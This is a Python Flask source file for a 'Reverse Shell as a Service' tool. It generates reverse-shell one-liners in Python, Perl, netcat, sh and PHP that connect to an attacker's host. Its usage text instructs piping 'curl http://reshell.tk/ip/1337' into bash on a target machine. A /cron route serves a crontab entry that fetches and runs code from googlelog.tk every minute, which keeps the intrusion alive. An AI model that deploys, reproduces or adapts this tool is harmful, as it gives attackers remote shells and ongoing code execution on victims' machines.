"""
Reverse Shell as a Service
"""
from flask import Flask
from flask import make_response

app = Flask(__name__)

usgae = \
"""# Reverse Shell as a Service
# https://github.com/omg2hei/ReShellAAS
#
# 1. On Attacker Machine:
#      nc -l 1337
#
# 2. On The Target Machine:
#      curl http://reshell.tk/ip/1337 | bash
#
# 3. Enjoy it.
"""

def reverse_shell_payload(host, port):
    payload = {
        'python': """python -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(("%(host)s",%(port)s)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call(["/bin/sh","-i"]);'""" % {'host': host, 'port': port},
        'perl': """perl -e 'use Socket;$i="%(host)s";$p=%(port)s;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'""" % {'host': host, 'port': port},
        'nc': """rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc %(host)s %(port)s >/tmp/f""" % {'host': host, 'port': port},
        'sh': """/bin/sh -i >& /dev/tcp/%(host)s/%(port)s 0>&1""" % {'host': host, 'port': port},
        'php': """php -r '$sock=fsockopen("%(host)s",%(port)s);exec("/bin/sh -i <&3 >&3 2>&3");'""" % {'host': host, 'port': port}, # 未测试
    }
    return payload

def generate_shell_script(host, port):
    payload = reverse_shell_payload(host, port)
    shell_script = ''
    for key in payload:
        shell_script += """
if command -v %(key)s > /dev/null 2>&1; then
    %(payload)s
    exit;
fi
        """ % {'key': key, 'payload': payload[key]}
    return shell_script

@app.route('/')
@app.route('/<host>/<port>')
def main(host=None, port=None):
    if host==None or port==None:
        response = make_response(usgae)
        response.headers["content-type"] = "text/plain"
        return response
    else:
        shell_script = generate_shell_script(host, port)
        response = make_response(usgae + shell_script)
        response.headers["content-type"] = "text/plain"
        return  response

@app.route('/cron')
def cron():
    crontab_text = "* * * * * /usr/bin/curl http://googlelog.tk/googlelog.tk/443 | bash\n"
    response = make_response(crontab_text)
    response.headers["content-type"] = "text/plain"
    return  response


if __name__ == '__main__':
    app.run(host='0.0.0.0', port=80)
